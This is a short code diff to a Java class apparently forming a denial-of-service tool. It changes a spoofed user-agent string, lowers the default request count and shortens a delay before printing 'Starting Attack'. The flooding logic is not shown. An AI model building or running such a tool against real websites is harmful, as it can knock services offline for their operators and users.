@@ -10,7 +10,7 @@ public class Dos implements Runnable {
 
 
 
-    private final String USER_AGENT =   "Mozilla/5.0 (Linux; Android 7.1.1; Google Pixel Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36";
+    private final String USER_AGENT =   "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1";
 
     private static int amount = 0;
     private static String url = "";
@@ -360,7 +360,7 @@ public class Dos implements Runnable {
         String amount = in.nextLine();
 
         if (amount == null || amount.equals(null) || amount.equals("")) {
-            Dos.amount = 100000;
+            Dos.amount = 1000;
         } else {
             Dos.amount = Integer.parseInt(amount);
         }
@@ -382,7 +382,7 @@ public class Dos implements Runnable {
             }
         }
 
-        Thread.sleep(2000);
+        Thread.sleep(1000);
 
 
         System.out.println("Starting Attack");
